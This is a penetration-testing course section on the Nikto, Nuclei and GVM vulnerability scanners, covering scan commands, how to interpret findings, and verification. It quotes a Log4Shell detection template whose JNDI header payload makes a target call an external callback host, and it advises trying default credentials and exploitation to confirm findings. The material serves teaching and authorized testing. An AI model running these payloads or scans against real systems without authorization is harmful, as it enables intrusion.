+Before running any scanner, internalize this: automated vulnerability scanners catch approximately 30-40% of vulnerabilities in a real web application. They excel at pattern matching — finding known vulnerable library versions, common misconfigurations, obvious injection points, and security header absences. They fail completely at business logic flaws, subtle access control issues, multi-step attack chains, and vulnerabilities unique to the specific application's implementation.
+
+Automated scanning is the first step, not the final answer. It identifies the low-hanging fruit and provides a coverage baseline so your manual testing can focus on the harder, higher-value issues.
+
+### Nikto — Web Server Configuration Scanner
+
+Nikto performs over 6,700 checks against web servers: dangerous files, outdated software, enabled unnecessary HTTP methods, security header issues, default installations, and known vulnerabilities.
+
+```bash
+# Basic scan
+nikto -h http://target.com
+nikto -h https://target.com
+
+# Scan with SSL
+nikto -h https://target.com -ssl
+
+# Save output in multiple formats
+nikto -h http://target.com -o nikto_results.html -Format htm
+nikto -h http://target.com -o nikto_results.txt -Format txt
+nikto -h http://target.com -o nikto_results.xml -Format xml
+
+# Scan a specific port
+nikto -h http://target.com -p 8080
+
+# Scan through Burp Suite proxy (capture Nikto's requests for review)
+nikto -h http://target.com -useproxy http://127.0.0.1:8080
+
+# Disable DNS resolution (faster)
+nikto -h http://target.com -nodns
+
+# Tune to specific test categories:
+# 0: File Upload, 1: Interesting File/Seen in logs, 2: Misconfiguration
+# 3: Information Disclosure, 4: Injection (XSS/Script/HTML), 5: Remote File Retrieval
+# 6: Denial of Service, 7: Remote File Retrieval (Server Wide), 8: Command Execution
+# 9: SQL Injection, a: Authentication Bypass, b: Software Identification
+nikto -h http://target.com -Tuning 4,9    # XSS and SQLi tests only
+```
+
+**Interpreting Key Nikto Findings:**
+
+`"The anti-clickjacking X-Frame-Options header is not present"` → The page can be embedded in an iframe. Clickjacking is possible. Medium finding, higher impact if the page contains sensitive actions.
+
+`"The X-Content-Type-Options header is not set"` → Browser MIME-type sniffing possible. Low-medium finding.
+
+`"Cookie session_id created without the httponly flag"` → XSS can steal this cookie. Critical if this is the primary session cookie.
+
+`"Cookie session_id created without the secure flag"` → Cookie sent over HTTP. High finding.
+
+`"Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, PUT, DELETE, TRACE"` → DELETE and TRACE enabled are findings. PUT enabled may allow file upload to the server root.
+
+`"Server leaks inodes via ETags, inode: XXXX, size: XXXX, mtime: XXXX"` → Information disclosure through ETag headers. Low finding.
+
+`"Default account found for 'admin': admin:admin"` → Default credentials confirmed. Critical finding.
+
+`"OSVDB-XXXX: /phpMyAdmin/: phpMyAdmin directory found"` → Database admin interface exposed. Critical finding — attempt default credentials and check for authentication bypass.
+
+`"Retrieved x-powered-by header: PHP/7.4.3"` → PHP version disclosure. Cross-reference against PHP CVE database for this specific version.
+
+### Nuclei — Template-Based Vulnerability Scanner
+
+Nuclei uses YAML templates — each template defines a specific test. The template library is community-maintained and grows rapidly, with new templates appearing within hours of major CVE disclosures.
+
+```bash
+# Update template library (run this before every engagement)
+nuclei -update-templates
+
+# Basic scan with default templates
+nuclei -u https://target.com
+
+# Scan with specific severity levels
+nuclei -u https://target.com -severity critical
+nuclei -u https://target.com -severity critical,high
+
+# Scan by tag categories
+nuclei -u https://target.com -tags cve           # All CVE checks
+nuclei -u https://target.com -tags exposure      # Exposed sensitive files/data
+nuclei -u https://target.com -tags misconfig     # Misconfigurations
+nuclei -u https://target.com -tags default-login # Default credentials
+nuclei -u https://target.com -tags xss           # XSS checks
+nuclei -u https://target.com -tags sqli          # SQL injection checks
+nuclei -u https://target.com -tags ssrf          # SSRF checks
+nuclei -u https://target.com -tags lfi           # Local file inclusion
+
+# Scan for a specific CVE
+nuclei -u https://target.com -id CVE-2021-44228    # Log4Shell
+nuclei -u https://target.com -id CVE-2021-26855   # ProxyLogon (Exchange)
+nuclei -u https://target.com -id CVE-2022-22965   # Spring4Shell
+
+# Scan a list of targets
+nuclei -list targets.txt -severity critical,high
+
+# Output to file
+nuclei -u https://target.com -o nuclei_findings.txt
+nuclei -u https://target.com -o nuclei_findings.json -json
+
+# Run against all URLs discovered in a web spider
+katana -u https://target.com -o urls.txt
+nuclei -list urls.txt -tags xss,sqli,ssrf
+
+# Concurrent scanning with rate limiting (be careful with production targets)
+nuclei -u https://target.com -rate-limit 50 -concurrency 25
+```
+
+**Understanding Nuclei Template Structure (Read One to Understand All):**
+
+```yaml
+id: CVE-2021-44228-log4j-rce    # Unique identifier
+
+info:
+  name: Apache Log4j RCE (Log4Shell)
+  author: pdteam
+  severity: critical
+  description: |
+    Apache Log4j2 allows JNDI lookups to remote LDAP servers, enabling 
+    remote code execution.
+  tags: cve,cve2021,apache,log4j,log4shell,jndi,rce
+
+requests:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: ${jndi:ldap://{{interactsh-url}}/exploit}  # JNDI payload in User-Agent
+        X-Forwarded-For: ${jndi:ldap://{{interactsh-url}}/exploit}
+        Accept: */*
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Match on DNS callback
+        words:
+          - "dns"
+```
+
+This template sends a JNDI lookup payload in request headers. If the application uses Log4j to log these headers (extremely common), the JNDI reference triggers a DNS lookup to the Nuclei interactsh callback server. The template matches on receiving that callback, confirming Log4Shell vulnerability.
+
+### Manual Verification After Automated Scanning
+
+Every automated scanner finding requires manual verification before going into a report. False positives waste client remediation effort and damage your credibility. Here is the verification mindset for common findings:
+
+**Security header findings:** These are almost always true positives — either the header is present in the response or it is not. Verify by making a request in Burp and checking the response headers yourself. Confirm in multiple response types (main page, login page, API endpoints — some may be configured inconsistently).
+
+**CVE findings based on version detection:** These require careful verification. Check whether the detected version is actually within the vulnerable range. Check whether the target platform (OS, distribution) may have backported patches. Attempt actual exploitation in a controlled way — confirm the vulnerability is actually exploitable rather than just theoretically present.
+
+**Default credential findings:** Always verify manually. Log in with the reported credentials and confirm you have the access level indicated.
+
+**Exposed file findings:** Visit the found URL and confirm the response is actually sensitive. Nikto may flag `/phpinfo.php` — verify the phpinfo page actually loads and reveals meaningful information.
+
+---
+
+## 6.1.8 Lab — Using the GVM Vulnerability Scanner
+
+### What GVM/OpenVAS Is and Why It Complements Nikto and Nuclei
+
+GVM (Greenbone Vulnerability Management) is the complete enterprise vulnerability management platform built around the OpenVAS scanning engine. Where Nikto is a quick web server configuration checker and Nuclei tests specific templates, GVM performs comprehensive network and application scanning using over 160,000 Network Vulnerability Tests (NVTs), organized by CVE, product, and severity.
+
+GVM is the open-source alternative to commercial platforms like Nessus Professional. It provides:
+- Authenticated scanning (providing credentials to get inside-out visibility)
+- Comprehensive vulnerability test library
+- Historical scan comparison
+- Structured report generation
+- REST API for integration
+
+### Setting Up GVM on Kali Linux
+
+```bash
+# Install GVM
+sudo apt update && sudo apt install -y gvm
+
+# Run first-time setup (takes 15-30 minutes - downloads all feeds)
+sudo gvm-setup
+
+# The setup will output admin credentials - SAVE THESE
+# Example output: "User created with password: 'r4nd0mP@ss'"
+
+# Start GVM services
+sudo gvm-start
+
+# Verify everything is running correctly
+sudo gvm-check-setup
+
+# Access the web interface
+# Open: https://127.0.0.1:9392 in your browser
+# Accept the self-signed certificate warning
+# Login with the credentials from setup
+```
+
+### Keeping GVM Updated
+
+Your scan results are only as good as your feed data. Run feed updates before every engagement:
+
+```bash
+# Update all GVM feeds
+sudo greenbone-nvt-sync          # Network Vulnerability Tests
+sudo greenbone-feed-sync --type SCAP   # CVE and OVAL data
+sudo greenbone-feed-sync --type CERT   # CERT-Bund advisories
+sudo greenbone-feed-sync --type GVMD_DATA   # GVM management data
+
+# After updating, restart services
+sudo gvm-stop && sudo gvm-start
+```
+
+### Creating and Running a Scan
+
+**Step 1: Create a Scan Target**
+In the web UI: Configuration → Targets → New Target
+- Name: "Module 6 Lab Target"
+- Hosts: IP address of your lab target (e.g., the DVWA or vulnerable VM IP)
+- Credentials: Add if doing authenticated scanning (SSH for Linux, SMB for Windows, HTTP credentials for web app)
+
+**Step 2: Create a Scan Task**
+Scans → Tasks → New Task
+- Name: "Initial Web Application Assessment"
+- Scan Targets: Select your created target
+- Scan Config: "Full and Fast" for comprehensive testing, or "Web Application Tests" for web-specific NVTs
+
+**Step 3: Start the Scan**
+Click the play button next to your task. Monitor progress in the Tasks view.
+
+**Step 4: Review Results**
+Once complete, click on the scan report. Navigate to Results to see individual findings organized by severity.
+
+### Understanding GVM Scan Configurations
+
+**Full and Fast:** Runs all applicable NVTs with optimized timing. This is the standard configuration for most assessments. Comprehensive coverage without being as intrusive as "Very Deep."
+
+**Full and Very Deep:** Runs the most thorough checks, including some potentially service-disrupting tests. Use this in isolated lab environments only — it may crash vulnerable services.
+
+**Web Application Tests:** Focuses specifically on web application NVTs — useful for targeted web assessments where you have already done infrastructure scanning separately.
+
+**Discovery:** Light scan that identifies services and open ports without deep vulnerability testing. Use this for initial host discovery in large networks.
+
+**System Discovery:** Even lighter — just host discovery. Similar to `nmap -sn`.
+
+### Reading GVM Reports
+
+GVM reports classify findings using CVSS:
+
+**Critical (CVSS 9.0-10.0):** Address immediately. Remotely exploitable with no authentication required, significant impact. These are your lead findings in any report.
+
+**High (CVSS 7.0-8.9):** Address urgently. Serious impact, typically exploitable remotely.
+
+**Medium (CVSS 4.0-6.9):** Address within 30 days. Significant but with mitigating factors.
+
+**Low (CVSS 0.1-3.9):** Address in next maintenance cycle. Real vulnerability but limited direct impact.
+
+**Log/Info:** Informational — host/service details, configuration observations. Not vulnerabilities but useful intelligence.
+
+**Exporting Reports:**
+
+```bash
+# Download report via GVM API (for automation)
+gvm-cli socket --gmp-username admin --gmp-password [pass] \
+  --xml "<get_reports report_id='UUID' format_id='c402cc3e-b531-11e1-9163-406186ea4fc5'/>" \
+  | xmllint --format - > report.xml
+```
+
+GVM supports multiple report formats: PDF, HTML, XML, CSV. Use XML for programmatic processing and integration with other tools. Use PDF or HTML for client deliverables.
+
+### Combining Scan Results — The Complete Picture
+
+No single scanner catches everything. Professional web application assessments use multiple tools in combination:
+
+**Layer 1 — GVM:** Comprehensive network and infrastructure vulnerability scanning. Identifies CVE-based vulnerabilities, unpatched software, insecure service configurations.
+
+**Layer 2 — Nikto:** Quick web server configuration check. Catches missing security headers, dangerous HTTP methods, exposed admin interfaces, default files.
+
+**Layer 3 — Nuclei:** Fast, template-based checks for specific CVEs, exposures, and misconfigurations. Best coverage for recently disclosed vulnerabilities.
+
+**Layer 4 — Burp Suite (manual):** Everything the above tools cannot see — business logic, IDOR, authentication bypasses, application-specific vulnerabilities, multi-step attack chains.
+
+The automated layers give you breadth. The manual layer gives you depth. Together, they approach something close to comprehensive coverage.
+
+---
+
+*— Section 6.1 is complete. Sections 6.2 through 6.13 continue in subsequent documents as instructed. —*
+
+---
